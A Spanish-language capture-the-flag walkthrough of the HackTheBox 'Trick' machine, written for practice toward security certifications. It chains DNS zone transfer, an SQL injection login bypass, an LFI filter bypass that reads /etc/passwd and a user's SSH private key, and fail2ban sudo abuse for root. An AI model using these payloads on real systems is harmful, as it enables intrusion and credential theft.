# Máquina "Trick" de HackTheBox

## Características

- Linux
- Fácil
- DNS enumeration
- Domain zone transfer attack (AXFR)
- SQL injection (SQLI)
- Manual blind SQLI with conditional responses [Python Scripting - AutoPwn]
- Local File Inclusion (LFI) + Wrappers
- SMTP Enumeration (VRFY - Discovering valid users)
- LFI to RCE - Nginx Log Poisoning
- Abusing Sudoers Privilege (fail2ban command)

## Útil en

- eWPT
- eWPTv2
- OSWE
- OSCP

## Reconocimiento

IP: 10.10.11.166

Escaneo inicial de puertos:
```bash
nmap -p- --min-rate 10000 10.10.11.166
```

```
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```

Escaneo más detallado:
```bash
nmap -p 22,25,53,80 -sCV 10.10.11.166
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Análisis inicial

Varios puertos están abiertos: 22 (SSH), 25 (SMTP), 53 (DNS) y 80 (HTTP). 
Al visitar el puerto 80, vemos un sitio web estático.

![Web inicial](/secciones/posts/imagenes/trick/web80.webp)

Agregué `trick.htb` a `/etc/hosts`. Como tenemos el puerto 53 (DNS) abierto, comencé a investigar ese servicio. Con un poco de esfuerzo pude hacer una transferencia de zona que me dio 2 subdominios diferentes.

```bash
dig @trick.htb axfr trick.htb +answer
```

Agregué ambos subdominios a la configuración del host y visité el host virtual `preprod-payroll.trick.htb`.

![Web virtual host](/secciones/posts/imagenes/trick/webvhost.webp)

## Explotación de SQL Injection

Vemos una página de inicio de sesión. Pude omitir la autenticación e iniciar sesión como administrador con una simple inyección SQL:

Usuario: `admin' or 1=1 -- -`  
Contraseña: cualquiera (en este caso usé "kavigihan")

![Login bypass](/secciones/posts/imagenes/trick/login.webp)

Como confirmé que había inyección SQL, pasé la solicitud de inicio de sesión a sqlmap. Copié la solicitud a `login.req` y ejecuté:

```bash
sqlmap -r login.req --risk=3 --level=3 --threads=10
```

Y encontró una inyección SQL basada en tiempo.

![SQLi detection](/secciones/posts/imagenes/trick/sqli.webp)

## Descubrimiento de subdominios

Uno de los vhosts era `preprod-payroll.trick.htb`, lo que me hizo pensar que podría haber otros vhosts con prefijo "preprod". Utilicé ffuf para enumerar:

```bash
ffuf -u http://$IP/ -H 'Host: preprod-FUZZ.trick.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1697
```

Encontré otro vhost llamado `preprod-marketing.trick.htb`. Lo agregué a la configuración de hosts y visité el sitio.

![Marketing site](/secciones/posts/imagenes/trick/web2.webp)

## Explotación de LFI

En el sitio de marketing, noté el parámetro `?page=` usado para incluir archivos. Probé un vector LFI típico (`../../../etc/passwd`) pero no funcionó. Los filtros PHP tampoco funcionaron. Finalmente encontré que esta técnica de bypass funcionaba:

```
....//....//....//etc/passwd
```

![LFI success](/secciones/posts/imagenes/trick/lfi.webp)

La técnica funciona porque `index.php` probablemente elimina todos `../` del parámetro. Con `....//`, cuando se eliminan `../`, queda `../`.

Para leer archivos usé:

```bash
curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd --path-as-is
```

Encontré un usuario llamado `michael` y luego obtuve su clave privada SSH:

```bash
curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa' --path-as-is
chmod 600 id_rsa
ssh michael@10.10.11.166 -i id_rsa
```

## Escalada de privilegios

Como Michael, ejecuté `sudo -l` y descubrí que podía ejecutar `fail2ban restart` como root sin contraseña. Investigando encontré una forma de explotar esto:

[Artículo sobre abuso de fail2ban](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7)

Verifiqué que teníamos acceso de escritura en `/etc/fail2ban/action.d`:

![Grupos de usuario](/secciones/posts/imagenes/trick/groups.webp)

El ataque consiste en editar un archivo de configuración que fail2ban usa para prohibir acceso a servicios. Cambiamos el comando que se ejecuta cuando ocurre un bloqueo.

Copié `/etc/fail2ban/action.d/iptables-multiport.conf` a `/tmp` y lo edité:

![Edición del archivo](/secciones/posts/imagenes/trick/edit.webp)

Luego lo moví de vuelta:

```bash
mv /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
```

Después de reiniciar fail2ban, el bit SUID (+S) se estableció en `/bin/bash`. Ejecuté `bash -p` y obtuve acceso como root, pudiendo buscar la flag final.

## Nota final

Algunos de los writeups en esta página pueden tener contenido de otras páginas o pocas imágenes, debido a que en algunas máquinas no tomé apuntes completos o capturas de pantalla. He decidido buscar varios writeups y agregar lo mejor explicado en cada uno. 